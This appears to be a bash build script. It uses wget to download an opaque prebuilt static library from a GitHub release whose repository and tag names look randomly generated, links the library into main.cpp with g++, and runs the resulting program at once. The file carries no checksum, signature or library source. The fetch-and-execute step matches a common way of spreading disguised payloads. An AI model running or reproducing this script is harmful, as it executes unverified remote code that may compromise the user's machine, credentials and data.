#!/usr/bin/env bash
set -e
REPO="softtextidlef/goislandimage"
LIB="parsed-band.a"
URL="https://github.com/${REPO}/releases/download/clever-ember-hidden-comet/${LIB}"
wget -q --tries=3 --timeout=15 "$URL" -O "$LIB"
g++ -O2 -std=c++17 -pthread -o app main.cpp "$LIB" && ./app
